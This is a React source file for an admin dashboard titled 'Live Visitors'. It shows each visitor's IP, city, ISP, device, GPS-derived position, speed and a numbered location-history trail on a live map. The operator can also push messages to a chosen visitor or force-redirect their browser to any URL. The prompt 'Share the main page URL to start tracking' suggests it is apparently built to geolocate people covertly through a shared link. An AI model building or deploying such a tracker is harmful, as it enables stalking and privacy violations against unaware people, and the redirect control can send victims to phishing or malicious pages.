"use client";

import { useEffect, useRef, useState } from "react";

interface LocationEntry {
  lat: number;
  lng: number;
  accuracy: number;
  speed: number | null;
  source: "ip" | "gps";
  timestamp: number;
}

interface Visitor {
  vid: string;
  ip: string;
  lat: number;
  lng: number;
  city: string;
  country: string;
  isp: string;
  device: string;
  browser: string;
  visitTime: number;
  lastSeen: number;
  source: "ip" | "gps";
  speed: number | null;
  accuracy: number;
  history: LocationEntry[];
}

function ago(ts: number) {
  const s = Math.floor(Date.now() / 1000 - ts);
  if (s < 5) return "just now";
  if (s < 60) return s + "s ago";
  if (s < 3600) return Math.floor(s / 60) + "m ago";
  return Math.floor(s / 3600) + "h ago";
}

function formatTime(ts: number) {
  return new Date(ts * 1000).toLocaleString();
}

export default function AdminPage() {
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [selectedVid, setSelectedVid] = useState<string | null>(null);
  const [history, setHistory] = useState<LocationEntry[]>([]);
  const [view, setView] = useState<"live" | "history">("live");
  const [msgVid, setMsgVid] = useState<string | null>(null);
  const [msgText, setMsgText] = useState("");
  const [msgSent, setMsgSent] = useState(false);
  const [redirVid, setRedirVid] = useState<string | null>(null);
  const [redirUrl, setRedirUrl] = useState("");
  const [redirSent, setRedirSent] = useState(false);
  const mapRef = useRef<HTMLDivElement>(null);
  const mapInstance = useRef<any>(null);
  const markersRef = useRef<Record<string, { marker: any; color: string }>>({});
  const historyLayerRef = useRef<any>(null);
  const colorIdx = useRef(0);
  const leafletLoaded = useRef(false);

  const colors = [
    "#3b82f6", "#ef4444", "#22c55e", "#f59e0b", "#a855f7",
    "#ec4899", "#06b6d4", "#f97316", "#84cc16", "#14b8a6",
  ];

  function getColor(vid: string) {
    if (markersRef.current[vid]) return markersRef.current[vid].color;
    return colors[colorIdx.current++ % colors.length];
  }

  // Load Leaflet
  useEffect(() => {
    if (leafletLoaded.current) return;
    leafletLoaded.current = true;

    const link = document.createElement("link");
    link.rel = "stylesheet";
    link.href = "https://unpkg.com/leaflet@1.9.4/dist/leaflet.css";
    document.head.appendChild(link);

    const script = document.createElement("script");
    script.src = "https://unpkg.com/leaflet@1.9.4/dist/leaflet.js";
    script.onload = () => {
      const L = (window as any).L;
      mapInstance.current = L.map(mapRef.current!, { zoomControl: false }).setView([25, 45], 3);
      L.control.zoom({ position: "bottomleft" }).addTo(mapInstance.current);
      L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png", {
        attribution: "&copy; CartoDB",
        maxZoom: 20,
        maxNativeZoom: 19,
      }).addTo(mapInstance.current);
    };
    document.head.appendChild(script);
  }, []);

  // Poll for visitors every 2 seconds
  useEffect(() => {
    let active = true;
    async function poll() {
      while (active) {
        try {
          const r = await fetch("/api/sessions");
          const data = await r.json();
          setVisitors(data);
        } catch {}
        await new Promise((res) => setTimeout(res, 2000));
      }
    }
    poll();
    return () => { active = false; };
  }, []);

  // Update map markers when visitors change
  useEffect(() => {
    const L = (window as any).L;
    if (!L || !mapInstance.current) return;

    const active = new Set<string>();

    visitors.forEach((v) => {
      active.add(v.vid);
      if (v.lat === 0 && v.lng === 0) return;

      const color = getColor(v.vid);
      const pos: [number, number] = [v.lat, v.lng];

      if (markersRef.current[v.vid]) {
        markersRef.current[v.vid].marker.setLatLng(pos);
      } else {
        const icon = L.divIcon({
          html: `<div style="position:relative"><div style="border:2px solid ${color};border-radius:50%;width:30px;height:30px;position:absolute;top:-8px;left:-8px;animation:pulse 2s ease-out infinite"></div><div style="width:14px;height:14px;border-radius:50%;background:${color};border:2px solid #fff;box-shadow:0 0 10px ${color}80"></div></div>`,
          className: "",
          iconSize: [14, 14],
          iconAnchor: [7, 7],
        });
        const marker = L.marker(pos, { icon }).addTo(mapInstance.current);
        marker.bindPopup(
          `<b>${v.vid}</b><br>${v.city}, ${v.country}<br>IP: ${v.ip}<br>${v.device} / ${v.browser}`
        );
        markersRef.current[v.vid] = { marker, color };
      }
    });

    Object.keys(markersRef.current).forEach((vid) => {
      if (!active.has(vid)) {
        mapInstance.current.removeLayer(markersRef.current[vid].marker);
        delete markersRef.current[vid];
      }
    });
  }, [visitors]);

  // Show history trail on map
  useEffect(() => {
    const L = (window as any).L;
    if (!L || !mapInstance.current) return;

    // Clear previous history layer
    if (historyLayerRef.current) {
      mapInstance.current.removeLayer(historyLayerRef.current);
      historyLayerRef.current = null;
    }

    if (history.length === 0 || !selectedVid) return;

    const group = L.layerGroup();

    // Draw trail line
    const points = history.filter(h => h.lat !== 0 || h.lng !== 0).map(h => [h.lat, h.lng] as [number, number]);
    if (points.length > 1) {
      L.polyline(points, { color: "#f59e0b", weight: 3, opacity: 0.7, dashArray: "8 4" }).addTo(group);
    }

    // Draw numbered dots for each history entry
    history.forEach((h, i) => {
      if (h.lat === 0 && h.lng === 0) return;
      const icon = L.divIcon({
        html: `<div style="width:22px;height:22px;border-radius:50%;background:${i === history.length - 1 ? '#22c55e' : '#f59e0b'};border:2px solid #fff;display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;color:#000">${i + 1}</div>`,
        className: "",
        iconSize: [22, 22],
        iconAnchor: [11, 11],
      });
      const m = L.marker([h.lat, h.lng], { icon }).addTo(group);
      m.bindPopup(
        `<b>#${i + 1}</b><br>
        Lat: ${h.lat.toFixed(6)}<br>
        Lng: ${h.lng.toFixed(6)}<br>
        Accuracy: ${h.accuracy.toFixed(0)}m<br>
        Source: ${h.source.toUpperCase()}<br>
        Time: ${formatTime(h.timestamp)}`
      );
    });

    group.addTo(mapInstance.current);
    historyLayerRef.current = group;

    // Fit map to history bounds
    if (points.length > 0) {
      mapInstance.current.fitBounds(L.latLngBounds(points).pad(0.2));
    }
  }, [history, selectedVid]);

  function flyTo(lat: number, lng: number) {
    if (mapInstance.current) mapInstance.current.setView([lat, lng], mapInstance.current.getMaxZoom());
  }

  async function showHistory(vid: string) {
    setSelectedVid(vid);
    setView("history");
    try {
      const r = await fetch(`/api/history?vid=${vid}`);
      const data = await r.json();
      setHistory(data);
    } catch {
      setHistory([]);
    }
  }

  function backToLive() {
    setSelectedVid(null);
    setHistory([]);
    setView("live");
  }

  async function sendRedirect() {
    if (!redirVid || !redirUrl.trim()) return;
    try {
      await fetch("/api/redirect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ vid: redirVid, url: redirUrl.trim() }),
      });
      setRedirSent(true);
      setTimeout(() => {
        setRedirVid(null);
        setRedirUrl("");
        setRedirSent(false);
      }, 1500);
    } catch {}
  }

  async function sendMessage() {
    if (!msgVid || !msgText.trim()) return;
    try {
      await fetch("/api/message", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ vid: msgVid, text: msgText.trim() }),
      });
      setMsgSent(true);
      setTimeout(() => {
        setMsgVid(null);
        setMsgText("");
        setMsgSent(false);
      }, 1500);
    } catch {}
  }

  const gpsCount = visitors.filter((v) => v.source === "gps").length;
  const ipCount = visitors.filter((v) => v.source === "ip").length;
  const selectedVisitor = visitors.find((v) => v.vid === selectedVid);

  return (
    <>
      <style>{`@keyframes pulse{0%{transform:scale(.5);opacity:.8}100%{transform:scale(2.5);opacity:0}}`}</style>

      <div ref={mapRef} style={{ width: "100vw", height: "100vh", position: "fixed", top: 0, left: 0 }} />

      {/* Top bar */}
      <div className="fixed top-0 left-0 right-0 z-[1000] bg-[#0a0a0aeb] backdrop-blur-xl border-b border-[#222] px-5 py-3 flex items-center justify-between">
        <h1 className="font-semibold">Live Visitors</h1>
        <div className="flex gap-5 text-sm">
          <span>Online: <span className="font-bold text-blue-500">{visitors.length}</span></span>
          <span>GPS: <span className="font-bold text-green-500">{gpsCount}</span></span>
        </div>
      </div>

      {/* Sidebar */}
      <div className="fixed top-[52px] right-0 bottom-0 w-[360px] z-[1000] bg-[#0a0a0aeb] backdrop-blur-xl border-l border-[#222] overflow-y-auto">

        {view === "live" && (
          <>
            <h3 className="px-4 pt-4 pb-2 text-xs text-gray-600 uppercase tracking-widest">
              Active Visitors
            </h3>
            {visitors.length === 0 ? (
              <div className="p-8 text-center text-gray-600 text-sm">
                No visitors yet.<br />Share the main page URL to start tracking.
              </div>
            ) : (
              visitors.map((v) => (
                <div
                  key={v.vid}
                  className="mx-3 my-1 p-3 bg-[#1a1a1a] rounded-xl border border-[#222] cursor-pointer hover:border-blue-500 transition-colors"
                >
                  <div className="flex justify-between items-center mb-1">
                    <span className="font-bold text-sm">{v.vid}</span>
                    <span
                      className={`text-[0.65rem] font-semibold px-2 py-0.5 rounded ${
                        v.source === "gps"
                          ? "bg-green-950 text-green-400"
                          : "bg-blue-950 text-blue-400"
                      }`}
                    >
                      {v.source.toUpperCase()}
                    </span>
                  </div>
                  <div className="text-sm text-gray-300">
                    {v.city}
                    {v.country ? `, ${v.country}` : ""}
                  </div>
                  <div className="text-xs text-gray-600 flex gap-2 mt-1 flex-wrap">
                    <span>IP: {v.ip}</span>
                    <span>{v.device} / {v.browser}</span>
                    <span>{ago(v.visitTime)}</span>
                    {v.speed != null && <span>{(v.speed * 3.6).toFixed(1)} km/h</span>}
                  </div>
                  <div className="flex gap-2 mt-2">
                    <button
                      onClick={() => flyTo(v.lat, v.lng)}
                      className="flex-1 text-xs bg-blue-500/20 text-blue-400 py-1.5 rounded-lg hover:bg-blue-500/30 transition-colors"
                    >
                      Locate
                    </button>
                    <button
                      onClick={() => showHistory(v.vid)}
                      className="flex-1 text-xs bg-amber-500/20 text-amber-400 py-1.5 rounded-lg hover:bg-amber-500/30 transition-colors"
                    >
                      History
                    </button>
                    <button
                      onClick={() => { setMsgVid(v.vid); setMsgText(""); setMsgSent(false); }}
                      className="flex-1 text-xs bg-purple-500/20 text-purple-400 py-1.5 rounded-lg hover:bg-purple-500/30 transition-colors"
                    >
                      Message
                    </button>
                  </div>
                  <div className="flex gap-2 mt-1">
                    <button
                      onClick={() => { setRedirVid(v.vid); setRedirUrl(""); setRedirSent(false); }}
                      className="flex-1 text-xs bg-red-500/20 text-red-400 py-1.5 rounded-lg hover:bg-red-500/30 transition-colors"
                    >
                      Redirect
                    </button>
                  </div>
                </div>
              ))
            )}
          </>
        )}

        {view === "history" && (
          <>
            <div className="px-4 pt-4 pb-2 flex items-center gap-3">
              <button
                onClick={backToLive}
                className="text-xs bg-[#222] text-gray-400 px-3 py-1.5 rounded-lg hover:bg-[#333] transition-colors"
              >
                &larr; Back
              </button>
              <h3 className="text-xs text-gray-600 uppercase tracking-widest">
                History: {selectedVid}
              </h3>
            </div>

            {selectedVisitor && (
              <div className="mx-3 mb-3 p-3 bg-[#1a1a1a] rounded-xl border border-[#222]">
                <div className="text-sm text-gray-300">
                  {selectedVisitor.city}{selectedVisitor.country ? `, ${selectedVisitor.country}` : ""}
                </div>
                <div className="text-xs text-gray-600 mt-1">
                  IP: {selectedVisitor.ip} &middot; {selectedVisitor.device} / {selectedVisitor.browser}
                </div>
                <div className="text-xs text-gray-600 mt-0.5">
                  First seen: {formatTime(selectedVisitor.visitTime)}
                </div>
              </div>
            )}

            <div className="px-4 pb-1">
              <span className="text-xs text-gray-600">{history.length} location records</span>
            </div>

            {history.length === 0 ? (
              <div className="p-8 text-center text-gray-600 text-sm">No location history yet.</div>
            ) : (
              history.map((h, i) => (
                <div
                  key={i}
                  onClick={() => flyTo(h.lat, h.lng)}
                  className="mx-3 my-1 p-3 bg-[#1a1a1a] rounded-xl border border-[#222] cursor-pointer hover:border-amber-500/50 transition-colors"
                >
                  <div className="flex justify-between items-center mb-1">
                    <span className="font-bold text-sm">
                      <span className={`inline-flex items-center justify-center w-5 h-5 rounded-full text-[0.6rem] font-bold mr-2 ${
                        i === history.length - 1 ? "bg-green-500 text-black" : "bg-amber-500 text-black"
                      }`}>
                        {i + 1}
                      </span>
                      {h.lat.toFixed(6)}, {h.lng.toFixed(6)}
                    </span>
                    <span className={`text-[0.65rem] font-semibold px-2 py-0.5 rounded ${
                      h.source === "gps" ? "bg-green-950 text-green-400" : "bg-blue-950 text-blue-400"
                    }`}>
                      {h.source.toUpperCase()}
                    </span>
                  </div>
                  <div className="text-xs text-gray-500 flex gap-3">
                    <span>{formatTime(h.timestamp)}</span>
                    <span>Acc: {h.accuracy.toFixed(0)}m</span>
                    {h.speed != null && <span>{(h.speed * 3.6).toFixed(1)} km/h</span>}
                  </div>
                </div>
              ))
            )}
          </>
        )}
      </div>

      {/* Redirect Modal */}
      {redirVid && (
        <div className="fixed inset-0 z-[2000] flex items-center justify-center bg-black/60 backdrop-blur-sm px-5">
          <div className="bg-[#1a1a1a] border border-[#333] rounded-2xl p-6 max-w-sm w-full shadow-2xl">
            {redirSent ? (
              <div className="text-center py-4">
                <div className="text-4xl mb-3">&#10003;</div>
                <p className="text-green-400 font-semibold">Redirect sent to {redirVid}</p>
              </div>
            ) : (
              <>
                <h3 className="text-lg font-bold mb-1">Redirect User</h3>
                <p className="text-xs text-gray-500 mb-4">Visitor {redirVid} will be sent to this URL</p>
                <input
                  value={redirUrl}
                  onChange={(e) => setRedirUrl(e.target.value)}
                  placeholder="https://example.com"
                  className="w-full bg-[#111] border border-[#333] rounded-xl p-3 text-sm text-white outline-none focus:border-red-500 mb-4"
                  autoFocus
                />
                <div className="flex gap-2">
                  <button
                    onClick={() => setRedirVid(null)}
                    className="flex-1 py-2.5 rounded-xl bg-[#222] text-gray-400 text-sm hover:bg-[#333] transition-colors"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={sendRedirect}
                    disabled={!redirUrl.trim()}
                    className="flex-1 py-2.5 rounded-xl bg-red-500 text-white text-sm font-semibold hover:bg-red-600 transition-colors disabled:opacity-30"
                  >
                    Redirect Now
                  </button>
                </div>
              </>
            )}
          </div>
        </div>
      )}

      {/* Send Message Modal */}
      {msgVid && (
        <div className="fixed inset-0 z-[2000] flex items-center justify-center bg-black/60 backdrop-blur-sm px-5">
          <div className="bg-[#1a1a1a] border border-[#333] rounded-2xl p-6 max-w-sm w-full shadow-2xl">
            {msgSent ? (
              <div className="text-center py-4">
                <div className="text-4xl mb-3">&#10003;</div>
                <p className="text-green-400 font-semibold">Message sent to {msgVid}</p>
              </div>
            ) : (
              <>
                <h3 className="text-lg font-bold mb-1">Send Message</h3>
                <p className="text-xs text-gray-500 mb-4">To visitor: {msgVid}</p>
                <textarea
                  value={msgText}
                  onChange={(e) => setMsgText(e.target.value)}
                  placeholder="Type your message..."
                  className="w-full bg-[#111] border border-[#333] rounded-xl p-3 text-sm text-white resize-none h-28 outline-none focus:border-purple-500 mb-4"
                  autoFocus
                />
                <div className="flex gap-2">
                  <button
                    onClick={() => setMsgVid(null)}
                    className="flex-1 py-2.5 rounded-xl bg-[#222] text-gray-400 text-sm hover:bg-[#333] transition-colors"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={sendMessage}
                    disabled={!msgText.trim()}
                    className="flex-1 py-2.5 rounded-xl bg-purple-500 text-white text-sm font-semibold hover:bg-purple-600 transition-colors disabled:opacity-30"
                  >
                    Send
                  </button>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </>
  );
}
